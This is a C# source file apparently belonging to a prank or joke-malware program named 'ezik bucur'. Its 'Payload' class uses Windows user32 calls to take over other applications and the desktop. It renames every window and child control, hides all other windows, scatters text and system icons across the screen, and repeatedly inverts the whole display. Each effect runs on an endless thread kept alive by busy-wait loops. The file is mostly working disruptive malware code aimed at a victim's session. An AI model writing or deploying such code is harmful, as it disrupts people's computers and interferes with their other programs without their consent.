using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace ezikbucur
{
    internal class Payload
    {
        private const string replaceW = "ezik bucur";

        #region dll

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int SetWindowText(IntPtr hWnd, string lpString);

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        static extern Int32 ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("user32.dll")]
        static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        static extern int ShowWindow(int hwnd, int command);

        delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        #endregion

        Thread? drawStringThread;
        Thread? replaceStringsThread;
        Thread? invertDesktopThread;

        public int PayloadIntensity = 6;

        private bool invertDesktopPayload = false;
        private bool replaceStringsPayload = false;
        private bool drawStringPayload = false;
        public bool drawIconsPayload = false;

        public bool InvertDesktopPayload
        {
            get
            {
                return this.invertDesktopPayload;
            }
            set
            {
                if (this.invertDesktopPayload != value)
                {
                    InvertDesktopToggle(value);
                    this.invertDesktopPayload = value;
                }
            }
        }
        public bool DrawIconPayload
        {
            get
            {
                return this.drawIconsPayload;
            }
            set
            {
                if (this.drawIconsPayload != value)
                {
                    drawStringToggle(value); //use the existing drawing function
                    this.drawIconsPayload = value;
                }
            }
        }
        public bool DrawStringPayload
        {
            get
            {
                return this.drawStringPayload;
            }
            set
            {
                if (this.drawStringPayload != value)
                {
                    drawStringToggle(value);
                    this.drawStringPayload = value;
                }
            }
        }
        public bool ReplaceStringsPayload
        {
            get
            {
                return this.replaceStringsPayload;
            }
            set
            {
                if (this.replaceStringsPayload != value)
                {
                    replaceStringsToggle(value);
                    this.replaceStringsPayload = value;
                }
            }
        }

        public void RestoreWindowHandles()
        {
            IntPtr mainHandle = Process.GetCurrentProcess().MainWindowHandle;
            const int SW_SHOW = 1;

            while (replaceStringsPayload)
            {
                EnumWindows((hWnd, lParam) =>
                {
                    StringBuilder sb = new(256);
                    GetWindowText(hWnd, sb, 255);
                    if (!string.IsNullOrWhiteSpace(sb.ToString()))
                    {
                        if (!sb.ToString().Contains("Default"))
                        {
                            if (hWnd != mainHandle)
                            {
                                try
                                {
                                    ShowWindow((int)hWnd, SW_SHOW);
                                    InvalidateRect(hWnd, IntPtr.Zero, true);
                                }
                                catch { }
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }
        }
        public void DestroyWindowHandles()
        {
            IntPtr mainHandle = Process.GetCurrentProcess().MainWindowHandle;
            const int SW_HIDE = 0;

            while (replaceStringsPayload)
            {
                EnumWindows((hWnd, lParam) =>
                {
                    StringBuilder sb = new(256);
                    GetWindowText(hWnd, sb, 255);
                    if (!string.IsNullOrWhiteSpace(sb.ToString()))
                    {
                        if (!sb.ToString().Contains("Default"))
                        {
                            if (hWnd != mainHandle)
                            {
                                try
                                {
                                    ShowWindow((int) hWnd, SW_HIDE);
                                    InvalidateRect(hWnd, IntPtr.Zero, true);
                                }
                                catch { }
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }
        }
        private void replaceStrings()
        {

            IntPtr mainHandle = Process.GetCurrentProcess().MainWindowHandle;

        payload:
            while (replaceStringsPayload)
            {
                EnumWindows((hWnd, lParam) =>
                {
                    StringBuilder sb = new(256);
                    GetWindowText(hWnd, sb, 255);
                    if (!string.IsNullOrWhiteSpace(sb.ToString()))
                    {
                        if (!sb.ToString().Contains("Default"))
                        {
                            if (hWnd != mainHandle)
                            {

                                SetWindowText(hWnd, replaceW);
                                EnumerateChildren(hWnd, mainHandle);
                                try
                                {
                                    InvalidateRect(hWnd, IntPtr.Zero, true);
                                }
                                catch { }
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);
                replaceStringsPayload = false;
            }
            while (!replaceStringsPayload) { }
            goto payload;
        }
        private static void EnumerateChildren(IntPtr hWnd, IntPtr mainHandle)
        {
            [DllImport("user32.dll")]
            static extern bool EnumChildWindows(IntPtr hWndParent, EnumWindowsProc lpEnumFunc, IntPtr lParam);

            EnumChildWindows(hWnd, (hWndc, lParam) =>
            {
                if (hWndc != mainHandle)
                {
                    SetWindowText(hWndc, replaceW);
                    EnumerateChildren(hWndc, mainHandle);
                }
                return true;
            }, IntPtr.Zero);
        }
        private void drawText()
        {
        payload:
            Random r = new();
            IntPtr desktopDC = GetDC(IntPtr.Zero);
            Rectangle rect = GraphicsHelper.GetScreenRect();
            while (drawStringPayload || drawIconsPayload)
            {
                int x = r.Next(0, rect.Width);
                int y = r.Next(0, rect.Height);
                try
                {
                    using (Graphics g = Graphics.FromHdc(desktopDC))
                    {
                        if(drawStringPayload)
                        {
                            using (Font font = new Font("Arial", 20))
                            {
                                g.DrawString(replaceW, font, Brushes.White, new Point(x, y));
                            }
                        }
                        if (drawIconsPayload)
                        {
                            x = r.Next(0, rect.Width);
                            y = r.Next(0, rect.Height);
                            g.DrawIcon(GetRandomIcon(r), x, y);
                        }
                    }
                }
                catch { }
                Thread.Sleep(5);
            }
            ReleaseDC(IntPtr.Zero, desktopDC);
            while (!drawStringPayload && !drawIconsPayload) { }
            goto payload;
        }
        private Icon GetRandomIcon(Random r)
        {
            int random = r.Next(10);
            switch (random)
            {
                case 0:
                    return SystemIcons.Application;
                case 1:
                    return SystemIcons.Asterisk;
                case 2:
                    return SystemIcons.Error;
                case 3:
                    return SystemIcons.Exclamation;
                case 4:
                    return SystemIcons.Hand;
                case 5:
                    return SystemIcons.Information;
                case 6:
                    return SystemIcons.Question;
                case 7:
                    return SystemIcons.Shield;
                case 8:
                    return SystemIcons.Warning;
                case 9:
                    return SystemIcons.WinLogo;
            }
            return SystemIcons.Question;
        }
        private void InvertDesktopThreadFunc()
        {
        payload:
            while (invertDesktopPayload)
            {
                try
                {
                    IntPtr desktopDC = GetDC(IntPtr.Zero);
                    Rectangle rect = GraphicsHelper.GetScreenRect();
                    using (Graphics g = Graphics.FromHdc(desktopDC))
                    {
                        Bitmap img = GraphicsHelper.InvertBitmap(GraphicsHelper.CaptureScreen());
                        g.DrawImage(img, new Rectangle(0, 0, rect.Width, rect.Height));
                        if (drawStringPayload || drawIconsPayload)
                        {
                            Random r = new();
                            int x, y;
                            for (int i = 0; i < PayloadIntensity; i++)
                            {
                                if (drawStringPayload)
                                {
                                    x = r.Next(0, rect.Width);
                                    y = r.Next(0, rect.Height);
                                    using (Font font = new Font("Arial", 16))
                                    {
                                        g.DrawString(replaceW, font, Brushes.White, new Point(x, y));
                                    }
                                }
                                x = r.Next(0, rect.Width);
                                y = r.Next(0, rect.Height);

                                if (drawIconsPayload)
                                {
                                    x = r.Next(0, rect.Width);
                                    y = r.Next(0, rect.Height);
                                    g.DrawIcon(GetRandomIcon(r), x, y);
                                }
                                
                            }
                        }

                    }
                    ReleaseDC(IntPtr.Zero, desktopDC);
                }
                catch { }
            }
            while (!invertDesktopPayload) { }
            goto payload;
        }
        private void InvertDesktopToggle(bool value)
        {
            if (value)
            {
                if (invertDesktopThread == null)
                {
                    invertDesktopThread = new(InvertDesktopThreadFunc);
                    invertDesktopThread.Start();
                }
            }
        }
        private void drawStringToggle(bool value)
        {
            if (value)
            {
                if (drawStringThread == null)
                {
                    drawStringThread = new(drawText);
                    drawStringThread.Start();
                }
            }
        }
        private void replaceStringsToggle(bool value)
        {
            if (value)
            {
                if (replaceStringsThread == null)
                {
                    replaceStringsThread = new(replaceStrings);
                    replaceStringsThread.Start();
                }
            }
        }
    }
}
